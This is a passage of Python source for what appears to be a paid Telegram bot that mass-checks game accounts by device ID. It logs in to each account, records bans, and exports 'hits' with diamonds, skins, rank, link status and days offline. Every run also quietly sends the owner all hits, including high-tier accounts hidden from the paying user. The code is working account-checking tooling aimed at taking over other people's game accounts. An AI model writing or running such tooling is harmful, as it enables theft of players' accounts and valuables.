                    pass
            else:
                if err == "STOPPED":
                    return
                if is_ban:
                    b = {"Device id": acc["device"], "role_id": acc["role_id"],
                         "zone_id": acc["zone_id"], "reason": err}
                    with s4_lock:
                        banned.append(b)
                        job_append_banned(jid, b)
                        job_inc_count(jid, "banned")
                else:
                    with s4_lock:
                        errors_pool.append(acc)
                        job_inc_count(jid, "errors")
            job_inc(jid)

        def _run_info_pool():
            with concurrent.futures.ThreadPoolExecutor(max_workers=INFO_THREADS) as ex:
                list(ex.map(worker_info, pending))
        await asyncio.to_thread(_run_info_pool)
        if not _gate():
            break
        round_no += 1
        if errors_pool:
            await asyncio.sleep(0.3)

    was_stopped = job_is_stopped(jid)
    # ---- Stop LIVE STATUS ----
    try:
        _live_stop.set()
        _j_snap = job_get(jid)
        if _live_msg and _j_snap:
            _final = (_build_live_status_text(_j_snap, label="FORCE CHECK")[0] if isinstance(_build_live_status_text(_j_snap, label="FORCE CHECK"), tuple) else _build_live_status_text(_j_snap, label="FORCE CHECK")).replace(
                "RUNNING", "STOPPED" if was_stopped else "DONE")
            await _live_status_final(app, chat_id, _live_msg.message_id, jid,
                                     "FORCE CHECK", _final)
    except Exception as e:
        print(f"[LIVE] force final fail: {type(e).__name__}: {e}")

    job_finish(jid)
    ctx.user_data.pop("active_job", None)

    status_word = "STOPPED" if was_stopped else "DONE"
    user_visible = []
    for acc, pd in valid:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if not _is_hidden_tier_user(base):
            user_visible.append((acc, pd))

    all_errs = login_errors + valid_errors + errors_pool
    lines = [
        f"{{shield}} FORCE CHECK {status_word} {{shield}}",
        "=====================",
        f"{{gear}} Clean       : {len(accounts)}",
        f"{{no_entry}} Banned      : {len(banned)}",
        f"{{star}} Valid       : {len(valid_accounts)}",
        f"{{crown}} Info hits   : {len(user_visible)}",
        f"{{dizzy}} Errors left : {len(all_errs)}",
        f"{{party}} Rounds run  : {round_no}",
    ]
    _sum_txt, _sum_ents = fmt_premium("\n".join(lines))
    try:
        if _sum_ents:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt, entities=_sum_ents)
        else:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt)
    except Exception as e:
        print(f"[PREMIUM] force summary fail: {type(e).__name__}: {e}")
        try:
            await app.bot.send_message(chat_id=chat_id, text="\n".join(lines))
        except Exception:
            pass

    ts = int(time.time())

    if user_visible:
        vfp = user_dir / f"force_info_{ts}.txt"
        with open(vfp, "w", encoding="utf-8") as f:
            for acc, pd in user_visible:
                f.write(build_hit_txt(acc.get("Device id", ""),
                                      acc.get("role_id") or 0,
                                      acc.get("zone_id") or 0, pd) + "\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(vfp, "rb"),
                                        caption=f"INFO TXT ({len(user_visible)})")
        except Exception:
            pass
        try:
            os.remove(vfp)
        except Exception:
            pass

    if banned:
        bfp = user_dir / f"force_banned_{ts}.txt"
        with open(bfp, "w", encoding="utf-8") as f:
            f.write(f"# BANNED DEVICE IDS ({len(banned)})\n\n")
            for b in banned:
                f.write(f"Device id: {b['Device id']} | account id: {b.get('role_id') or 0} | zone id: {b.get('zone_id') or 0}\n")
                f.write(f"  Reason: {b.get('reason', 'N/A')}\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(bfp, "rb"),
                                        caption=f"BANNED TXT ({len(banned)})")
        except Exception:
            pass
        try:
            os.remove(bfp)
        except Exception:
            pass

    if all_errs:
        efp = user_dir / f"force_error_{ts}.txt"
        with open(efp, "w", encoding="utf-8") as f:
            f.write(f"# ERROR DEVICE IDS ({len(all_errs)})\n\n")
            for e in all_errs:
                _dev = e.get('Device id') or e.get('device') or '?'
                _rid = e.get('role_id') or 0
                _zid = e.get('zone_id') or 0
                f.write(f"Device id: {_dev} | account id: {_rid} | zone id: {_zid}\n")
                f.write(f"  Error: {e.get('reason', 'N/A')}\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(efp, "rb"),
                                        caption=f"ERROR TXT ({len(all_errs)})")
        except Exception:
            pass
        try:
            os.remove(efp)
        except Exception:
            pass

    try:
        _visible_players = [pd for acc, pd in user_visible]
        if _visible_players:
            await _send_tier_image_auto(
                app, chat_id, _visible_players,
                "FORCE CHECK", "FORCE CHECKED")
    except Exception as _e:
        print(f"[TIER IMG] force fail: {type(_e).__name__}: {_e}")

    for owner_id in {OWNER_ID}:
        try:
            afp = user_dir / f"force_owner_{ts}.txt"
            with open(afp, "w", encoding="utf-8") as f:
                f.write(f"USER: {uid}\nUSERNAME: @{db_get_username(uid)}\n")
                f.write(f"STATUS: {status_word}\nCLEAN: {len(accounts)}\n")
                f.write(f"BANNED: {len(banned)}\nVALID: {len(valid_accounts)}\n")
                f.write(f"INFO: {len(valid)}\nERRORS: {len(all_errs)}\n")
                f.write(f"ROUNDS: {round_no}\n\n")
                for acc, pd in valid:
                    f.write(build_hit_txt(acc.get("Device id", ""),
                                          acc.get("role_id") or 0,
                                          acc.get("zone_id") or 0, pd) + "\n\n")
            await app.bot.send_document(chat_id=owner_id, document=open(afp, "rb"),
                                        caption=f"OWNER - FORCE {status_word}\nUser: {uid}")
            try:
                os.remove(afp)
            except Exception:
                pass
        except Exception:
            pass

    try:
        _ready_txt, _ready_ents = fmt_premium("{ok} Ready.")
        try:
            if _ready_ents:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            entities=_ready_ents,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await app.bot.send_message(chat_id=chat_id, text="Ready.",
                                        reply_markup=kb_main(uid in ADMIN_IDS))
    except Exception:
        pass


# ======================================================================
#  DUMPING TASK
# ======================================================================
async def run_dumping_task(chat_id, ctx, uid, accounts):
    app = ctx.application
    jid = job_new(uid, check_type="dumping")
    job_update(jid, step=3, step_name="VALID CHECK", total=len(accounts), chat_id=chat_id)
    ctx.user_data["active_job"] = jid
    # ---- LIVE STATUS ----
    _live_msg = None
    _live_stop = asyncio.Event()
    try:
        _lt, _le = _build_live_status_text(job_get(jid), label="DUMPING")
        _live_msg = await app.bot.send_message(
            chat_id=chat_id,
            text=_lt,
            entities=_le if _le else None,
        )
        asyncio.create_task(_live_status_loop(
            app, chat_id, jid, _live_msg.message_id, "DUMPING", _live_stop))
    except Exception as _e:
        print(f"[LIVE] DUMPING start fail: {type(_e).__name__}: {_e}")

    def _gate():
        while True:
            # Instant stop check (global flag)
            if _is_stopped(jid):
                return False
            j = job_get(jid)
            if not j:
                return False
            if j["state"] == "stopped":
                _mark_stop(jid)
                return False
            if j["state"] == "paused":
                time.sleep(0.2)
                continue
            return True

    valid_accounts = []
    s3_lock = threading.Lock()

    def worker_valid(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        rid = acc.get("role_id")
        zid = acc.get("zone_id")
        if rid and zid:
            with s3_lock:
                va = {"device": dev, "role_id": int(rid), "zone_id": int(zid)}
                valid_accounts.append(va)
                job_append_valid_account(jid, va)
                job_inc_count(jid, "valid")
            job_inc(jid)
            return
        try:
            with GameConnection(device_id=dev) as conn:
                a_id = conn.account_id
                z_id = conn.zone_id
            if a_id and z_id:
                with s3_lock:
                    va = {"device": dev, "role_id": a_id, "zone_id": z_id}
                    valid_accounts.append(va)
                    job_append_valid_account(jid, va)
                    job_inc_count(jid, "valid")
            else:
                job_inc_count(jid, "errors")
        except Exception:
            job_inc_count(jid, "errors")
        job_inc(jid)

    def _run_valid_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=DUMPING_THREADS)
        try:
            futures = [ex.submit(worker_valid, a) for a in accounts]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_valid_pool)

    was_stopped = job_is_stopped(jid)
    # ---- Stop LIVE STATUS ----
    try:
        _live_stop.set()
        _j_snap = job_get(jid)
        if _live_msg and _j_snap:
            _final = (_build_live_status_text(_j_snap, label="DUMPING")[0] if isinstance(_build_live_status_text(_j_snap, label="DUMPING"), tuple) else _build_live_status_text(_j_snap, label="DUMPING")).replace(
                "RUNNING", "STOPPED" if was_stopped else "DONE")
            await _live_status_final(app, chat_id, _live_msg.message_id, jid,
                                     "DUMPING", _final)
    except Exception as e:
        print(f"[LIVE] dumping final fail: {type(e).__name__}: {e}")

    job_finish(jid)
    ctx.user_data.pop("active_job", None)

    status_word = "STOPPED" if was_stopped else "DONE"
    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    ts = int(time.time())

    lines = [
        f"{{party}} DUMPING {status_word} {{party}}",
        "=====================",
        f"{{gear}} Input      : {len(accounts)}",
        f"{{star}} Valid      : {len(valid_accounts)}",
        f"{{no_entry}} Invalid    : {len(accounts) - len(valid_accounts)}",
    ]
    _sum_txt, _sum_ents = fmt_premium("\n".join(lines))
    try:
        if _sum_ents:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt, entities=_sum_ents)
        else:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt)
    except Exception as e:
        print(f"[PREMIUM] dumping summary fail: {type(e).__name__}: {e}")
        try:
            await app.bot.send_message(chat_id=chat_id, text="\n".join(lines))
        except Exception:
            pass

    if valid_accounts:
        vfp = user_dir / f"dumping_valid_{ts}.txt"
        with open(vfp, "w", encoding="utf-8") as f:
            f.write(f"# DUMPING VALID ({len(valid_accounts)})\n\n")
            for acc in valid_accounts:
                f.write(f"Device id: {acc['device']} | account id: {acc['role_id']} | zone id: {acc['zone_id']}\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(vfp, "rb"),
                                        caption=f"VALID TXT ({len(valid_accounts)})")
        except Exception:
            pass
        try:
            os.remove(vfp)
        except Exception:
            pass

    try:
        img_path = make_valid_total_image(
            total_input=len(accounts), total_valid=len(valid_accounts),
            check_label="DUMPING RESULT", title="DUMPING CHECK")
        if img_path and os.path.isfile(img_path):
            _dump_cap, _dump_cap_ents = fmt_premium(
                f"{{party}} DUMPING RESULT {{party}}\n"
                f"{{star}} TOTAL VALID: {len(valid_accounts)}")
            if _dump_cap_ents:
                await app.bot.send_photo(chat_id=chat_id, photo=open(img_path, "rb"),
                                         caption=_dump_cap, caption_entities=_dump_cap_ents)
            else:
                await app.bot.send_photo(chat_id=chat_id, photo=open(img_path, "rb"),
                                         caption=_dump_cap)
            try:
                os.remove(img_path)
            except Exception:
                pass
    except Exception:
        pass

    # ---------- TIER BREAKDOWN IMAGE ----------
    try:
        if valid_accounts:
            _players = []
            for _acc in valid_accounts[:200]:
                try:
                    _r = lookup_player_data(
                        _acc["device"],
                        _acc["role_id"],
                        _acc["zone_id"])
                    if _r and _r.get("status") == "success":
                        _players.append(_r["player_data"])
                except Exception:
                    pass
            if _players:
                await _send_tier_image_auto(
                    app, chat_id, _players,
                    "DUMPING CHECK", "DUMPING RESULT")
    except Exception as _e:
        print(f"[TIER IMG] dumping fail: {type(_e).__name__}: {_e}")

    for owner_id in {OWNER_ID}:
        try:
            afp = user_dir / f"dumping_owner_{ts}.txt"
            with open(afp, "w", encoding="utf-8") as f:
                f.write(f"USER: {uid}\nUSERNAME: @{db_get_username(uid)}\nDUMPING {status_word}\n")
                f.write(f"Input: {len(accounts)}\nValid: {len(valid_accounts)}\n\n")
                for acc in valid_accounts:
                    f.write(f"Device id: {acc['device']} | account id: {acc['role_id']} | zone id: {acc['zone_id']}\n")
            await app.bot.send_document(chat_id=owner_id, document=open(afp, "rb"),
                                        caption=f"OWNER - DUMPING {status_word}\nUser: {uid}")
            try:
                os.remove(afp)
            except Exception:
                pass
        except Exception:
            pass

    try:
        _ready_txt, _ready_ents = fmt_premium("{ok} Ready.")
        try:
            if _ready_ents:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            entities=_ready_ents,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await app.bot.send_message(chat_id=chat_id, text="Ready.",
                                        reply_markup=kb_main(uid in ADMIN_IDS))
    except Exception:
        pass


# ======================================================================
#  FILES / STATS
# ======================================================================
async def send_hits_list(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{cry} No hits.", reply_markup=kb_files())
        return
    visible = [r for r in rows if (uid in ADMIN_IDS) or not _is_hidden_tier_user(r[8])]
    lines = [f"Your Hits (latest 20 of {len(visible)}):\n"]
    for r in visible[:20]:
        hid, dev, acc, zone, nick, lvl, skins, tier_full = r[:8]
        lines.append(f"#{hid} | {nick or 'N/A'} | Lv{lvl} | {tier_full or 'No Tier'}")
    if not visible:
        lines.append("(all hidden)")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_files())


async def send_hits_file(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{skull} Empty.", reply_markup=kb_files())
        return
    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    fp = user_dir / f"my_hits_{int(time.time())}.txt"
    with open(fp, "w", encoding="utf-8") as f:
        for r in rows:
            (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
             rank, hrank, dia, v2l, ts, src, last_ts, banned) = r
            if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
                continue
            days = _offline_days(last_ts)
            days_str = f"{days} day(s)" if days is not None else "N/A"
            f.write("=" * 60 + "\n")
            f.write(f"Hit #{hid}\nDevice ID: {dev}\nAccount ID: {acc}\nZone ID: {zone}\n")
            f.write(f"Name: {nick}\nLevel: {lvl}\nSkin Count: {skins}\n")
            f.write(f"Collector Tier: {tier_full}\nHigh Rank: {hrank}\n")
            f.write(f"Diamonds: {dia}\nV2L: {v2l}\n")
            f.write(f"BANNED: {'TRUE' if banned else 'FALSE'}\n")
            f.write(f"Offline Days: {days_str}\n")
            f.write(f"Date: {format_timestamp(ts)}\n" + "=" * 60 + "\n\n")
    await update.message.reply_document(document=open(fp, "rb"),
                                        caption="Your hits", reply_markup=kb_files())
    try:
        os.remove(fp)
    except Exception:
        pass


async def send_user_tier_image(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{cry} No hits.", reply_markup=kb_files())
        return
    players = []
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        players.append({"collector_tier": r[7] or "No Tier"})
    if not players:
        await _send_premium(update, "{cry} No visible hits.", reply_markup=kb_files())
        return
    img_path = make_tier_breakdown_image(players, title="TIER BREAKDOWN")
    if img_path and os.path.isfile(img_path):
        _tcap, _tents = fmt_premium(
            f"{{medal}} TIER BREAKDOWN {{medal}}\n"
            f"{{star}} Total: {len(players)}")
        if _tents:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_tcap, caption_entities=_tents,
                                             reply_markup=kb_files())
        else:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_tcap,
                                             reply_markup=kb_files())
        try:
            os.remove(img_path)
        except Exception:
            pass


async def send_user_rank_image(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{cry} No hits.", reply_markup=kb_files())
        return
    players = []
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        players.append({"high_rank": r[11] or "Unknown"})
    if not players:
        await _send_premium(update, "{cry} No visible hits.", reply_markup=kb_files())
        return
    img_path = make_rank_breakdown_image(players, title="RANK BREAKDOWN")
    if img_path and os.path.isfile(img_path):
        _rcap, _rents = fmt_premium(
            f"{{crown}} RANK BREAKDOWN {{crown}}\n"
            f"{{star}} Total: {len(players)}")
        if _rents:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_rcap, caption_entities=_rents,
                                             reply_markup=kb_files())
        else:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_rcap,
                                             reply_markup=kb_files())
        try:
            os.remove(img_path)
        except Exception:
            pass


async def send_user_full_image(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{cry} No hits.", reply_markup=kb_files())
        return
    players = []
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        players.append({
            "collector_tier": r[7] or "No Tier",
            "high_rank": r[11] or "Unknown",
            "v2l_status": r[13] or "N/A",
            "last_login_ts": r[16] or 0,
        })
    if not players:
        await _send_premium(update, "{cry} No visible hits.", reply_markup=kb_files())
        return
    img_path = make_full_breakdown_image(players, title="FULL BREAKDOWN")
    if img_path and os.path.isfile(img_path):
        _fcap, _fents = fmt_premium(
            f"{{party}} FULL BREAKDOWN {{party}}\n"
            f"{{star}} Total: {len(players)}")
        if _fents:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_fcap, caption_entities=_fents,
                                             reply_markup=kb_stats())
        else:
            await update.message.reply_photo(photo=open(img_path, "rb"),
                                             caption=_fcap,
                                             reply_markup=kb_stats())
        try:
            os.remove(img_path)
        except Exception:
            pass


async def start_tier_selection(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{cry} No hits.", reply_markup=kb_files())
        return
    buckets = {}
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        buckets.setdefault(r[7] or "No Tier", []).append(r)
    if not buckets:
        await _send_premium(update, "{cry} No visible hits.", reply_markup=kb_files())
        return
    sorted_tiers = sorted(buckets.keys(), key=lambda t: (
        _base_sort_key(_normalize_collector_tier(t)[0]),
        -ROMAN_ORDER.get(_normalize_collector_tier(t)[1], 0)))
    ctx.user_data["pending_tiers"] = {
        "buckets": buckets, "sorted_tiers": sorted_tiers, "selected": set()}
    ctx.user_data["menu"] = "tier_select"
    lines = ["SELECT TIER FILES\n", "Available tiers:\n"]
    for i, tier in enumerate(sorted_tiers, 1):
        lines.append(f"[{i}] {tier} ({len(buckets[tier])})")
    lines.append("")
    lines.append("Type: 1 | 1,3,5 | 1-5 | SELECT ALL")
    lines.append("Then DONE to download, CANCEL to abort.")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_tier_select())


async def handle_tier_selection_text(update, ctx, uid, text):
    state = ctx.user_data.get("pending_tiers")
    if not state:
        await _send_premium(update, "{skull} Session expired.", reply_markup=kb_files())
        ctx.user_data["menu"] = "files"
        return
    tiers = state["sorted_tiers"]
    buckets = state["buckets"]
    selected = state["selected"]

    if text == "\U0001F192 CANCEL" or text == "CANCEL":
        ctx.user_data.pop("pending_tiers", None)
        ctx.user_data["menu"] = "files"
        await _send_premium(update, "{skull} Cancelled.", reply_markup=kb_files())
        return
    if text == "SELECT ALL":
        selected.clear()
        selected.update(tiers)
        await update.message.reply_text(f"Selected ALL {len(tiers)} tiers.\nType DONE.")
        return
    if text == "DONE":
        if not selected:
            await _send_premium(update, "{dizzy2} Nothing selected.")
            return
        await perform_tier_download(update, ctx, uid, list(selected))
        ctx.user_data.pop("pending_tiers", None)
        ctx.user_data["menu"] = "files"
        return

    parsed = _parse_selection_text(text, len(tiers))
    if not parsed:
        await _send_premium(update, "{cry} Invalid. Examples: 1 | 1,3,5 | 1-5 | SELECT ALL | DONE")
        return
    for i in parsed:
        selected.add(tiers[i - 1])
    await update.message.reply_text(
        f"Selected ({len(selected)}). Type more, SELECT ALL, or DONE.",
        reply_markup=kb_tier_select())


def _parse_selection_text(text, max_n):
    result = set()
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part and not part.startswith("-"):
            try:
                a, b = part.split("-", 1)
                a, b = int(a.strip()), int(b.strip())
                for x in range(min(a, b), max(a, b) + 1):
                    if 1 <= x <= max_n:
                        result.add(x)
            except ValueError:
                continue
        elif part.isdigit():
            x = int(part)
            if 1 <= x <= max_n:
                result.add(x)
    return sorted(result)


async def perform_tier_download(update, ctx, uid, tier_list):
    state = ctx.user_data.get("pending_tiers")
    if not state:
        await _send_premium(update, "{skull} Session expired.", reply_markup=kb_files())
        return
    buckets = state["buckets"]
    user_dir = USERS_DIR / str(uid)
    ts = int(time.time())
    tier_dir = user_dir / f"selected_{ts}"
    tier_dir.mkdir(parents=True, exist_ok=True)
    written = []
    total_acc = 0
    for tier in tier_list:
        items = buckets.get(tier, [])
        if not items:
            continue
        total_acc += len(items)
        slug = re.sub(r"[^A-Za-z0-9]+", "_", tier).strip("_") or "unknown"
        fp = tier_dir / f"{slug}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(f"##### {tier} - {len(items)} accounts #####\n\n")
            for r in items:
                (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
                 rank, hrank, dia, v2l, ts_, src, last_ts, banned) = r
                days = _offline_days(last_ts)
                days_str = f"{days}d" if days is not None else "N/A"
                f.write(f"#{hid} - {dev}\n")
                f.write(f"  ID: {acc} ({zone})\n")
                f.write(f"  Name: {nick}\n")
                f.write(f"  Level: {lvl} | Skins: {skins}\n")
                f.write(f"  High Rank: {hrank}\n")
                f.write(f"  Diamonds: {dia} | V2L: {v2l} | Offline: {days_str}\n\n")
        written.append(fp)
    await update.message.reply_text(
        f"TIER FILES READY\n\nTiers: {len(written)}\nAccounts: {total_acc}")
    for fp in written:
        try:
            await update.message.reply_document(document=open(fp, "rb"),
                                                caption=fp.stem.replace("_", " "),
                                                reply_markup=kb_files())
        except Exception:
            pass
    try:
        shutil.rmtree(tier_dir, ignore_errors=True)
    except Exception:
        pass


async def send_tier_zip_all(update, ctx, uid):
    rows = db_user_hits(uid)
    if not rows:
        await _send_premium(update, "{skull} Empty.", reply_markup=kb_files())
        return
    user_dir = USERS_DIR / str(uid)
    tier_dir = user_dir / f"tiers_all_{int(time.time())}"
    tier_dir.mkdir(parents=True, exist_ok=True)
    buckets = {}
    for r in rows:
        base = r[8]
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        buckets.setdefault(r[7] or "No Tier", []).append(r)
    if not buckets:
        await _send_premium(update, "{cry} No visible hits.", reply_markup=kb_files())
        return
    for tier, items in buckets.items():
        slug = re.sub(r"[^A-Za-z0-9]+", "_", tier).strip("_") or "unknown"
        fp = tier_dir / f"{slug}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(f"##### {tier} - {len(items)} accounts #####\n\n")
            for r in items:
                (hid, dev, acc, zone, nick, lvl, skins, tier_full, base, roman,
                 rank, hrank, dia, v2l, ts_, src, last_ts, banned) = r
                days = _offline_days(last_ts)
                days_str = f"{days}d" if days is not None else "N/A"
                f.write(f"#{hid} - {dev}\n  ID: {acc} ({zone})\n  Name: {nick}\n")
                f.write(f"  Level: {lvl} | Skins: {skins}\n  High Rank: {hrank}\n\n")
    zip_path = user_dir / f"tiers_all_{int(time.time())}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fp in tier_dir.glob("*.txt"):
            zf.write(fp, fp.name)
    await update.message.reply_document(document=open(zip_path, "rb"),
                                        caption=f"All tier files ({len(buckets)} tiers)",
                                        reply_markup=kb_files())
    try:
        shutil.rmtree(tier_dir, ignore_errors=True)
        os.remove(zip_path)
    except Exception:
        pass


async def send_v2l_breakdown(update, ctx, uid):
    stats = db_user_stats(uid)
    lines = ["V2L Breakdown:\n"]
    if not stats["v2l"]:
        lines.append("(none)")
    else:
        for st, cnt in stats["v2l"]:
            lines.append(f"  {st or 'N/A'} -> {cnt}")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


async def send_offline_breakdown_stats(update, ctx, uid):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        rows = c.execute("SELECT last_login_ts, collector_base FROM hits WHERE user_id=?",
                          (uid,)).fetchall()
    filtered_ts = []
    for last_ts, base in rows:
        if not (uid in ADMIN_IDS) and _is_hidden_tier_user(base):
            continue
        filtered_ts.append(last_ts or 0)
    counts = {label: 0 for label, _, _ in OFFLINE_BUCKETS}
    unknown = 0
    total = 0
    for ts_val in filtered_ts:
        days = _offline_days(ts_val)
        if days is None:
            unknown += 1
            continue
        bucket = _bucket_offline(days)
        if bucket in counts:
            counts[bucket] += 1
            total += 1
        else:
            unknown += 1
    lines = ["Offline Days Breakdown:", ""]
    mx = max(counts.values()) if counts else 1
    mx = max(mx, 1)
    for label, _, _ in OFFLINE_BUCKETS:
        cnt = counts.get(label, 0)
        bar_len = int(20 * cnt / mx) if mx > 0 else 0
        lines.append(f"  {label:<12} {'#'*bar_len}{'.'*(20-bar_len)}  {cnt}")
    if unknown:
        lines.append(f"  Unknown      {'-'*20}  {unknown}")
    lines.append("")
    lines.append(f"Total with login: {total}")
    await update.message.reply_text("\n".join(lines), reply_markup=kb_stats())


# ======================================================================
#  KEY EXPIRY WATCHER
# ======================================================================
async def key_expiry_watcher(app):
    while True:
        try:
            now = int(time.time())
            users = db_all_access_users()
            for (uid, trial_until, key_until, key_active, notified) in users:
                if uid in ADMIN_IDS:
                    continue
                if key_active and key_until and key_until <= now and not notified:
                    db_mark_expired_notified(uid)
                    try:
                        _exp_txt, _exp_ents = fmt_premium(
                            f"{{no_entry}} YOUR KEY HAS EXPIRED {{no_entry}}\n\n"
                            + NEED_ACCESS_MSG)
                        if _exp_ents:
                            await app.bot.send_message(
                                chat_id=uid, text=_exp_txt, entities=_exp_ents,
                                reply_markup=kb_main(False))
                        else:
                            await app.bot.send_message(
                                chat_id=uid, text=_exp_txt,
                                reply_markup=kb_main(False))
                    except Exception:
                        pass
                elif (not key_active) and trial_until and trial_until <= now and not notified:
                    db_mark_expired_notified(uid)
                    try:
                        _exp_txt, _exp_ents = fmt_premium(
                            f"{{no_entry}} YOUR TRIAL HAS EXPIRED {{no_entry}}\n\n"
                            + NEED_ACCESS_MSG)
                        if _exp_ents:
                            await app.bot.send_message(
                                chat_id=uid, text=_exp_txt, entities=_exp_ents,
                                reply_markup=kb_main(False))
                        else:
                            await app.bot.send_message(
                                chat_id=uid, text=_exp_txt,
                                reply_markup=kb_main(False))
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(300)


# ======================================================================
#  GLOBAL ERROR HANDLER
# ======================================================================
async def _global_error_handler(update, context):
    """Catch all errors to prevent bot crash."""
    import traceback
    err = context.error
    if err is None:
        return
    # Ignore common non-fatal errors
    err_name = type(err).__name__
    if err_name in ("TimedOut", "NetworkError", "RetryAfter", "BadRequest"):
        print(f"[ERR] {err_name}: {err}")
        return
    print(f"[ERR] Unhandled: {err_name}: {err}")
    try:
        traceback.print_exception(type(err), err, err.__traceback__)
    except Exception:
        pass




async def cmd_testpremium(update: Update, ctx):
    """Test ALL 17 premium emoji."""
    if not update.effective_user:
        return
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("Admin only.")
        return
    test_text = (
        "=== ORIGINAL 7 ===\n"
        "{medal} Medal\n"
        "{star} Star\n"
        "{no_entry} No Entry\n"
        "{dizzy} Dizzy\n"
        "{shield} Shield\n"
        "{sun} Sun\n"
        "{hand} Hand\n\n"
        "=== NEW 10 ===\n"
        "{plate} Plate\n"
        "{thumb} Thumb\n"
        "{gear} Gear\n"
        "{party} Party\n"
        "{crown} Crown\n"
        "{ghost} Ghost\n"
        "{tada} Tada\n"
        "{yin_yang} Yin Yang\n"
        "{megaphone} Megaphone\n"
        "{cool} Cool\n\n"
        "If CUSTOM animated → PREMIUM OK ✅\n"
        "If unicode → fallback (bot needs Premium)"
    )
    _txt, _ents = fmt_premium(test_text)
    try:
        if _ents:
            await update.message.reply_text(_txt, entities=_ents)
        else:
            await update.message.reply_text(_txt)
    except Exception as e:
        await update.message.reply_text(f"❌ {type(e).__name__}: {e}")



# ======================================================================
#  ENTRY
# ======================================================================
def main():
    db_init()
    db_load_extra_admins()
    print(f"[+] {BOT_NAME} BOT v3.8.1 starting...")
    print(f"[+] OWNER: {OWNER_ID}")
    print(f"[+] ADMINS: {sorted(ADMIN_IDS)}")
    print(f"[+] DB: {DB_PATH}")
    print(f"[+] Pillow: {_PIL_OK}")
    print(f"[+] Inline styles: {_INLINE_STYLE_SUPPORTED}")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .connect_timeout(60.0)
        .read_timeout(60.0)
        .write_timeout(60.0)
        .pool_timeout(60.0)
        .get_updates_connect_timeout(60.0)
        .get_updates_read_timeout(60.0)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("testpremium", cmd_testpremium))
    app.add_handler(CallbackQueryHandler(on_force_join_button, pattern="^fj_check$"))
    app.add_handler(CallbackQueryHandler(on_single_image_button, pattern="^img_"))
    app.add_handler(CallbackQueryHandler(on_payment_callback, pattern="^pay_(wave|kbz)_"))
    app.add_handler(CallbackQueryHandler(on_admin_payment_callback, pattern="^pay_(approve|reject)_"))
    app.add_handler(MessageHandler(filters.PHOTO, on_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(_global_error_handler)

    async def _post_init(app_):
        # Start key expiry watcher only when app is running
        app_.create_task(key_expiry_watcher(app_))
    app.post_init = _post_init

    print("[+] Polling... (timeout=30s, interval=0.5s)")
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        poll_interval=0.5,
        timeout=30,
        drop_pending_updates=True,
    )


if __name__ == "__main__":
    main()
